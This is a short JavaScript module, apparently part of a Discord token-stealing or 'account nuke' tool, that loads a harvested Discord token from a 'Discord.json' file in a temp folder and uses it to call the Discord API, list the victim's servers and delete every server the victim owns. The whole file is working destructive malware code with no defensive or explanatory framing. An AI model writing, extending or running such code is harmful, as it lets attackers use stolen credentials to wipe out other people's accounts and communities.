const axios = require('axios');
const { readFileSync } = require('fs');
const { join } = require('path');
const { tempFolder } = require('../index');
const { discord: { nukeAccount }, userAgent } = require('../config');
const { token } = JSON.parse(readFileSync(join(tempFolder, 'Discord.json')).toString()).accounts[0];

if (nukeAccount.deleteAllOwnedGuilds) {
  axios.get('https://discord.com/api/v10/users/@me/guilds', {
    headers: { 'User-Agent': userAgent, Authorization: token }
  }).then(res => {
    const guilds = res.data;
    guilds.filter(guild => guild.owner === true)?.forEach(guild => {
      axios.post(`https://discord.com/api/v10/guilds/${guild.id}/delete`, null, {
        headers: { 'User-Agent': userAgent, Authorization: token }
      });
    });
  });
}
